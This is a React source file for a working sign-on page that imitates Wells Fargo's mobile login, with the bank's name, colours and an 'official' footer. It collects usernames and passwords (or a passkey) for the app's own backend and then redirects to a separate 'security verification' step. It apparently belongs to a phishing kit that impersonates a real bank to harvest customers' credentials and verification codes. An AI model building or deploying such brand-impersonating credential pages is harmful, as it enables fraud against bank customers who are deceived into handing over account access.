import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { Key, ArrowRight, Menu } from "lucide-react";
import { Link, useLocation } from "wouter";
import { OfficialFooter } from "@/components/official-footer";

const loginSchema = z.object({
  username: z.string().min(1, "Username is required"),
  password: z.string().min(1, "Password is required"),
  saveUsername: z.boolean().default(false),
});

type LoginFormData = z.infer<typeof loginSchema>;

function getGreeting() {
  const hour = new Date().getHours();
  if (hour < 12) return "Good morning";
  if (hour < 17) return "Good afternoon";
  return "Good evening";
}

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [greeting] = useState(getGreeting());
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const [biometricLoading, setBiometricLoading] = useState(false);

  const handleBiometricLogin = async () => {
    setBiometricLoading(true);
    try {
      const challengeRes = await fetch("/api/auth/biometric/challenge", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "authenticate" }),
      });
      
      if (!challengeRes.ok) throw new Error("Failed to get challenge");
      
      const { challenge, rpId, allowCredentials } = await challengeRes.json();
      
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: Uint8Array.from(atob(challenge), c => c.charCodeAt(0)),
          rpId: rpId || window.location.hostname,
          allowCredentials: allowCredentials?.map((id: string) => ({
            id: Uint8Array.from(atob(id), c => c.charCodeAt(0)),
            type: "public-key" as const,
          })) || [],
          userVerification: "preferred",
          timeout: 60000,
        },
      }) as PublicKeyCredential;

      if (credential) {
        const authRes = await fetch("/api/auth/biometric/authenticate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            credentialId: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential as any).rawId)))),
            signature: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).signature)))),
            authenticatorData: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array((credential.response as any).authenticatorData)))),
            clientDataJSON: btoa(String.fromCharCode.apply(null, Array.from(new Uint8Array(credential.response.clientDataJSON)))),
          }),
        });

        if (authRes.ok) {
          toast({
            title: "Biometric Sign On Successful",
            description: "Redirecting to verification...",
          });
          sessionStorage.setItem("loginUsername", "biometric_user");
          setTimeout(() => setLocation("/verify"), 1000);
        }
      }
    } catch (error: any) {
      toast({
        title: "Biometric Sign On Failed",
        description: error.name === "NotAllowedError" 
          ? "Biometric authentication was cancelled or not available."
          : "Please try again or use your username and password.",
        variant: "destructive",
      });
    } finally {
      setBiometricLoading(false);
    }
  };

  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
      saveUsername: false,
    },
  });

  const loginMutation = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const response = await apiRequest("POST", "/api/auth/login", {
        username: data.username,
        password: data.password,
      });
      return response;
    },
    onSuccess: (_, variables) => {
      sessionStorage.setItem("loginUsername", variables.username);
      toast({
        title: "Sign On Successful",
        description: "Please complete security verification...",
      });
      setTimeout(() => {
        setLocation("/verify");
      }, 1000);
    },
    onError: (error: Error) => {
      toast({
        title: "Sign On Failed",
        description: error.message || "Invalid username or password",
        variant: "destructive",
      });
    },
  });

  const onSubmit = (data: LoginFormData) => {
    loginMutation.mutate(data);
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-[#d71e28] px-4 py-3 flex items-center justify-between">
        <div className="flex-1"></div>
        <h1 
          className="text-white text-xl tracking-wide font-bold"
          style={{ fontFamily: "'Times New Roman', Georgia, serif", letterSpacing: "0.15em" }}
        >
          WELLS FARGO
        </h1>
        <div className="flex-1 flex justify-end">
          <button className="text-white p-1" data-testid="button-menu">
            <Menu className="w-7 h-7" strokeWidth={2.5} />
          </button>
        </div>
      </header>

      {/* Yellow accent bar */}
      <div className="h-1.5 bg-[#ffcd41]"></div>

      {/* Main Content */}
      <main className="flex-1 px-5 py-8">
        {/* Greeting */}
        <h2 
          className="text-3xl text-[#1a1a1a] mb-8"
          style={{ fontFamily: "Georgia, 'Times New Roman', serif" }}
          data-testid="text-greeting"
        >
          {greeting}
        </h2>

        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
            {/* Username Input */}
            <FormField
              control={form.control}
              name="username"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      placeholder="Username"
                      className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                      data-testid="input-username"
                      {...field}
                    />
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Password Input */}
            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <div className="relative">
                      <Input
                        type={showPassword ? "text" : "password"}
                        placeholder="Password"
                        className="h-14 px-4 pr-16 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                        data-testid="input-password"
                        {...field}
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium underline"
                        data-testid="button-toggle-password"
                      >
                        {showPassword ? "Hide" : "Show"}
                      </button>
                    </div>
                  </FormControl>
                  <FormMessage />
                </FormItem>
              )}
            />

            {/* Save Username */}
            <FormField
              control={form.control}
              name="saveUsername"
              render={({ field }) => (
                <FormItem>
                  <div className="flex items-start gap-3 mt-2">
                    <FormControl>
                      <Checkbox
                        checked={field.value}
                        onCheckedChange={field.onChange}
                        className="mt-0.5 h-5 w-5 border-2 border-gray-400 data-[state=checked]:bg-[#d71e28] data-[state=checked]:border-[#d71e28]"
                        data-testid="checkbox-save-username"
                      />
                    </FormControl>
                    <div>
                      <label className="text-base text-[#1a1a1a] font-medium cursor-pointer">
                        Save username
                      </label>
                      <p className="text-sm text-gray-600 mt-1 leading-snug">
                        To help keep your account secure, save your username only on devices that aren't used by other people.
                      </p>
                    </div>
                  </div>
                </FormItem>
              )}
            />

            {/* Sign On Button */}
            <div className="pt-4">
              <Button
                type="submit"
                className="w-full h-14 bg-gray-200 hover:bg-gray-300 text-gray-500 font-semibold rounded-full text-lg transition-all disabled:opacity-100"
                disabled={loginMutation.isPending || !form.watch("username") || !form.watch("password")}
                data-testid="button-sign-on"
                style={{
                  backgroundColor: form.watch("username") && form.watch("password") ? "#ffcd41" : "#e5e5e5",
                  color: form.watch("username") && form.watch("password") ? "#1a1a1a" : "#9ca3af",
                }}
              >
                {loginMutation.isPending ? "Signing on..." : "Sign on"}
              </Button>
            </div>

            {/* Or divider */}
            <div className="flex items-center justify-center py-2">
              <span className="text-gray-500 text-base">or</span>
            </div>

            {/* Use a passkey button */}
            <Button
              type="button"
              variant="outline"
              className="w-full h-14 rounded-full border-2 border-[#1a1a1a] text-[#1a1a1a] font-semibold text-base hover:bg-gray-50"
              data-testid="button-passkey"
              onClick={handleBiometricLogin}
              disabled={biometricLoading}
            >
              <Key className="w-5 h-5 mr-2" />
              {biometricLoading ? "Authenticating..." : "Use a passkey"}
            </Button>

            {/* Passkey info */}
            <p className="text-sm text-gray-600 text-center leading-snug mt-2">
              Don't have one? Create a passkey after signing on and skip the password next time.
            </p>
          </form>
        </Form>

        {/* Forgot link */}
        <div className="mt-8 flex items-center gap-2">
          <ArrowRight className="w-4 h-4 text-[#d71e28]" />
          <Link 
            href="/forgot-password" 
            className="text-[#6b21a8] font-medium underline"
            data-testid="link-forgot"
          >
            Forgot username or password?
          </Link>
        </div>

        {/* Enroll section */}
        <div className="mt-8 pt-6 border-t border-gray-200">
          <div className="flex items-center justify-between">
            <span className="text-base text-gray-700">New to Wells Fargo?</span>
            <Link 
              href="/register" 
              className="text-[#d71e28] font-bold flex items-center gap-1"
              data-testid="link-register"
            >
              Enroll Now
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </div>
      </main>

      <OfficialFooter />
    </div>
  );
}
